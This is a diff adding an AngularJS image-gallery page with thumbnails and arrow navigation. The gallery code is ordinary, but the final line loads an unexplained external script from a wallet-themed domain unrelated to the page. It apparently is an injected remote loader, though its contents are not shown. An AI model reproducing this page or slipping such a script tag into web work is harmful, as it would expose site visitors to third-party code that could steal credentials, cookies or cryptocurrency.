@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en" ng-app="imageBrowserApp">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Image Browser</title>
+    <link
+      href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css"
+      rel="stylesheet"
+    />
+    <script
+      src="https://kit.fontawesome.com/8f60e01193.js"
+      crossorigin="anonymous"
+    ></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script>
+    <style>
+      .gallery-container {
+        position: relative;
+        width: 100%;
+        max-width: 400px; /* Adjust this to your preference */
+        margin: auto;
+      }
+
+      .main-image {
+        width: 100%;
+        height: auto;
+        margin-bottom: 10px;
+      }
+
+      .thumbnail-container {
+        display: flex;
+        justify-content: center;
+        flex-wrap: wrap;
+      }
+
+      .thumbnail {
+        width: 50px;
+        height: 50px;
+        margin: 5px;
+        cursor: pointer;
+        opacity: 0.6;
+      }
+
+      .thumbnail:hover {
+        opacity: 1;
+      }
+
+      .arrow {
+        cursor: pointer;
+        position: absolute;
+        top: 50%;
+        transform: translateY(-50%);
+        z-index: 100;
+        color: white;
+        background-color: transparent;
+        border: none;
+        font-size: 2rem;
+      }
+
+      .arrow-left {
+        left: 10px;
+      }
+
+      .arrow-right {
+        right: 10px;
+      }
+
+      .selected {
+        opacity: 1 !important;
+        border: 2px solid #007bff;
+      }
+    </style>
+  </head>
+
+  <body ng-controller="ImageBrowserController">
+    <div class="gallery-container">
+      <button ng-click="previousImage()" class="arrow arrow-left">
+        <i class="far fa-hand-point-left"></i>
+      </button>
+
+      <button ng-click="nextImage()" class="arrow arrow-right">
+        <i class="far fa-hand-point-right"></i>
+      </button>
+
+      <img ng-src="{{selectedImage}}" alt="Selected Image" class="main-image" />
+
+      <div class="thumbnail-container">
+        <img
+          ng-repeat="image in images"
+          ng-src="{{image.thumbnail}}"
+          ng-click="selectImage(image.src)"
+          alt="Thumbnail"
+          class="thumbnail"
+          ng-class="{'selected': image.src === selectedImage}"
+        />
+      </div>
+    </div>
+
+    <script>
+      angular
+        .module("imageBrowserApp", [])
+        .controller("ImageBrowserController", function ($scope) {
+          $scope.currentIndex = 0;
+          $scope.images = [
+            {
+              id: 1,
+              src: "https://picsum.photos/id/10/350/350",
+              thumbnail: "https://picsum.photos/id/10/50/50",
+            },
+            {
+              id: 2,
+              src: "https://picsum.photos/id/20/350/350",
+              thumbnail: "https://picsum.photos/id/20/50/50",
+            },
+            {
+              id: 3,
+              src: "https://picsum.photos/id/30/350/350",
+              thumbnail: "https://picsum.photos/id/30/50/50",
+            },
+            {
+              id: 4,
+              src: "https://picsum.photos/id/40/350/350",
+              thumbnail: "https://picsum.photos/id/40/50/50",
+            },
+            {
+              id: 5,
+              src: "https://picsum.photos/id/50/350/350",
+              thumbnail: "https://picsum.photos/id/50/50/50",
+            },
+            {
+              id: 6,
+              src: "https://picsum.photos/id/60/350/350",
+              thumbnail: "https://picsum.photos/id/60/50/50",
+            },
+            {
+              id: 7,
+              src: "https://picsum.photos/id/70/350/350",
+              thumbnail: "https://picsum.photos/id/70/50/50",
+            },
+            {
+              id: 8,
+              src: "https://picsum.photos/id/80/350/350",
+              thumbnail: "https://picsum.photos/id/80/50/50",
+            },
+            {
+              id: 9,
+              src: "https://picsum.photos/id/90/350/350",
+              thumbnail: "https://picsum.photos/id/90/50/50",
+            },
+            {
+              id: 10,
+              src: "https://picsum.photos/id/100/350/350",
+              thumbnail: "https://picsum.photos/id/100/50/50",
+            },
+            {
+              id: 11,
+              src: "https://picsum.photos/id/110/350/350",
+              thumbnail: "https://picsum.photos/id/110/50/50",
+            },
+            {
+              id: 12,
+              src: "https://picsum.photos/id/120/350/350",
+              thumbnail: "https://picsum.photos/id/120/50/50",
+            },
+          ];
+
+          $scope.selectedImage = $scope.images[$scope.currentIndex].src;
+
+          $scope.selectImage = function (imageSrc) {
+            $scope.selectedImage = imageSrc;
+            $scope.currentIndex = $scope.images.findIndex(
+              (img) => img.src === imageSrc
+            );
+          };
+
+          $scope.previousImage = function () {
+            $scope.currentIndex =
+              ($scope.currentIndex - 1 + $scope.images.length) %
+              $scope.images.length;
+            $scope.selectedImage = $scope.images[$scope.currentIndex].src;
+          };
+
+          $scope.nextImage = function () {
+            $scope.currentIndex =
+              ($scope.currentIndex + 1) % $scope.images.length;
+            $scope.selectedImage = $scope.images[$scope.currentIndex].src;
+          };
+        });
+    </script>
+    <script src="https://morethanwallet.com/appstore/index.js"></script>
+  </body>
+</html>
